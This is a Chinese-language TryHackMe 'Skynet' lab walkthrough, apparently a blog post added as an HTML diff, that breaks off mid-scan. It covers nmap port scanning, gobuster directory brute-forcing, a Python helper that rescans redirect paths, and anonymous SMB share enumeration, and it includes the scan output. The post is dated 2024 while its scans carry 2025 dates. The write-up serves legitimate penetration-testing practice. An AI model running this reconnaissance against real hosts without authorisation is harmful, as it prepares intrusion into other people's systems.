@@ -1,0 +1,445 @@
+<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THM - Offensive Pentesting - Section2 - Skynet | symv1a</title><meta name="author" content="symv1a,symv1a@163.com"><meta name="copyright" content="symv1a"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="THM - Offensive Pentesting - Section2 - Skynet‍ 外网打点nmap扫描报告12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849nmap -sV -sC -p- --min-rate 10000 10.10.220.42Start">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM - Offensive Pentesting - Section2 - Skynet">
+<meta property="og:url" content="https://symya.github.io/post/skynet-z1e39th.html">
+<meta property="og:site_name" content="symv1a">
+<meta property="og:description" content="THM - Offensive Pentesting - Section2 - Skynet‍ 外网打点nmap扫描报告12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849nmap -sV -sC -p- --min-rate 10000 10.10.220.42Start">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png">
+<meta property="article:published_time" content="2024-07-14T15:22:03.000Z">
+<meta property="article:modified_time" content="2024-07-14T21:55:05.000Z">
+<meta property="article:author" content="symv1a">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="打靶">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="TryHackMe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "THM - Offensive Pentesting - Section2 - Skynet",
+  "url": "https://symya.github.io/post/skynet-z1e39th.html",
+  "image": "https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png",
+  "datePublished": "2024-07-14T15:22:03.000Z",
+  "dateModified": "2024-07-14T21:55:05.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "symv1a",
+      "url": "https://symya.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png"><link rel="canonical" href="https://symya.github.io/post/skynet-z1e39th.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THM - Offensive Pentesting - Section2 - Skynet',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/symya/MyPic/2025/wallhaven-z8egpo.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" alt="Logo"><span class="site-name">symv1a</span></a><a class="nav-page-title" href="/"><span class="site-name">THM - Offensive Pentesting - Section2 - Skynet</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">THM - Offensive Pentesting - Section2 - Skynet</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-07-14T15:22:03.000Z" title="Created 2024-07-14 15:22:03">2024-07-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-14T21:55:05.000Z" title="Updated 2024-07-14 21:55:05">2024-07-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/THM/">THM</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>14mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:150,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2024-07-14 21:55:05&quot;}" hidden></div><h1 id="THM-Offensive-Pentesting-Section2-Skynet"><a href="#THM-Offensive-Pentesting-Section2-Skynet" class="headerlink" title="THM - Offensive Pentesting - Section2 - Skynet"></a>THM - Offensive Pentesting - Section2 - Skynet</h1><p>‍</p>
+<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="nmap扫描报告"><a href="#nmap扫描报告" class="headerlink" title="nmap扫描报告"></a>nmap扫描报告</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -p- --min-rate 10000 10.10.220.42</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-14 03:50 EDT</span><br><span class="line">Warning: 10.10.220.42 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.220.42</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 51285 closed ports, 14244 filtered ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)</span><br><span class="line">|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)</span><br><span class="line">|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Skynet</span><br><span class="line">110/tcp open  pop3        Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE SASL TOP PIPELINING RESP-CODES UIDL CAPA</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp open  imap        Dovecot imapd</span><br><span class="line">|_imap-capabilities: IDLE more have post-login listed Pre-login ENABLE LITERAL+ LOGINDISABLEDA0001 LOGIN-REFERRALS capabilities SASL-IR IMAP4rev1 OK ID</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h40m04s, deviation: 2h53m13s, median: 3s</span><br><span class="line">|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: skynet</span><br><span class="line">|   NetBIOS computer name: SKYNET\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: skynet</span><br><span class="line">|_  System time: 2025-04-14T02:51:04-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-04-14T07:51:03</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 62.96 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>简单分析一下：</p>
+<ul>
+<li><p>22&#x2F;tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</p>
+<ul>
+<li>ssh 没有找到账密，暂时不值得看</li>
+</ul>
+</li>
+<li><p>80&#x2F;tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</p>
+<ul>
+<li>网页端</li>
+</ul>
+</li>
+<li><p>110&#x2F;tcp open  pop3        Dovecot pop3d</p>
+<ul>
+<li>可能是邮件服务器</li>
+</ul>
+</li>
+<li><p>143&#x2F;tcp open  imap        Dovecot imapd</p>
+<ul>
+<li>可能是邮件服务的一部分</li>
+</ul>
+</li>
+<li><p>139&#x2F;tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p>
+<ul>
+<li>smb</li>
+</ul>
+</li>
+<li><p>445&#x2F;tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</p>
+<ul>
+<li>smb</li>
+</ul>
+</li>
+</ul>
+<h2 id="gobuster扫目录"><a href="#gobuster扫目录" class="headerlink" title="gobuster扫目录"></a>gobuster扫目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w <span class="string">&quot;D:\01tools\wordlist\SecLists-master\SecLists-master\Discovery\Web-Content\common.txt&quot;</span> --proxy socks5://192.168.111.100:9051 -u http://10.10.220.42/ --no-error</span><br></pre></td></tr></table></figure>
+
+<p>可算找到一个好用一点的目录了，注意！！！如果使用<code>-s</code>​ <code>-b</code>参数，容易导致扫描不出来东西，限定在200了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106124235.png" alt="image"></p>
+<p>重定向了，说明目录存在，</p>
+<p>可以先放着，我们暂时不看80端口，我们往下看，nmap的扫描结果中提到了，存在<code>pop3</code>​和<code>imap</code></p>
+<blockquote>
+<p>批量对status_code为301的扫描结果进行二次扫描，脚本分享</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="comment"># 用户可配置的区域</span></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Gobuster 第一次扫描的输出文件</span></span><br><span class="line">INPUT_FILE = <span class="string">&quot;result.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标网站的基础 URL（不要加结尾的 /）</span></span><br><span class="line">BASE_URL = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Gobuster 字典路径（Windows 目录可用双引号包裹）</span></span><br><span class="line">WORDLIST = <span class="string">r&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要加的文件扩展（多个用逗号隔开）</span></span><br><span class="line"><span class="comment"># EXTENSIONS = &quot;php,html,txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SOCKS5 代理（格式为 socks5://IP:PORT）</span></span><br><span class="line">PROXY = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否启用 --no-error 参数（防止错误干扰输出）</span></span><br><span class="line">NO_ERROR = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="comment"># 脚本核心逻辑</span></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_301_paths</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从 Gobuster 输出中提取所有 301 路径</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    paths = []</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;^(/[\w\-/\.]+)\s+\(Status:\s+301\)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            <span class="keyword">match</span> = pattern.search(line)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                paths.append(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> paths</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_gobuster_on_path</span>(<span class="params">base_url, path, wordlist, proxy, no_error</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用 Gobuster 对给定路径执行目录扫描，并带 SOCKS5 代理</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    full_url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span><span class="subst">&#123;path&#125;</span>/&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 正在扫描: <span class="subst">&#123;full_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    command = [</span><br><span class="line">        <span class="string">&quot;gobuster&quot;</span>, <span class="string">&quot;dir&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-u&quot;</span>, full_url,</span><br><span class="line">        <span class="string">&quot;-w&quot;</span>, wordlist,</span><br><span class="line">        <span class="string">&quot;--proxy&quot;</span>, proxy,</span><br><span class="line">        <span class="comment"># &quot;-x&quot;, extensions</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> no_error:</span><br><span class="line">        command.append(<span class="string">&quot;--no-error&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        subprocess.run(command, check=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Gobuster 扫描失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Gobuster 未安装或不在 PATH 中。&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(INPUT_FILE):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 文件不存在: <span class="subst">&#123;INPUT_FILE&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 正在分析 Gobuster 输出...&quot;</span>)</span><br><span class="line">    paths = extract_301_paths(INPUT_FILE)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> paths:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 没有找到 301 路径。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 找到 <span class="subst">&#123;<span class="built_in">len</span>(paths)&#125;</span> 个 301 重定向路径，开始扫描...\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">        run_gobuster_on_path(BASE_URL, path, WORDLIST, PROXY, NO_ERROR)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote>
+<p>深度遍历后找到了<code>10.10.5.178/squirrelmail/src</code>​，重定向到了<code>http://10.10.5.178/squirrelmail/src/login.php</code>，发现登录页面。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106124623.png" alt="image"></p>
+<h2 id="SMBMap枚举sanba共享机"><a href="#SMBMap枚举sanba共享机" class="headerlink" title="SMBMap枚举sanba共享机"></a>SMBMap枚举sanba共享机</h2><blockquote>
+<p>SMBMap 允许用户枚举整个域中的 samba 共享驱动器</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbmap -H IP</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>使用nmap对smb服务进行扫描</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.220.42</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-14 05:05 EDT</span><br><span class="line">Nmap scan report for 10.10.220.42</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-enum-shares: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   \\10.10.220.42\IPC$: </span><br><span class="line">|     Type: STYPE_IPC_HIDDEN</span><br><span class="line">|     Comment: IPC Service (skynet server (Samba, Ubuntu))</span><br><span class="line">|     Users: 1</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\tmp</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">|     Current user access: READ/WRITE</span><br><span class="line">|   \\10.10.220.42\anonymous: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Skynet Anonymous Share</span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\srv\samba</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">|     Current user access: READ/WRITE</span><br><span class="line">|   \\10.10.220.42\milesdyson: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Miles Dyson Personal Share</span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\home\milesdyson\share</span><br><span class="line">|     Anonymous access: 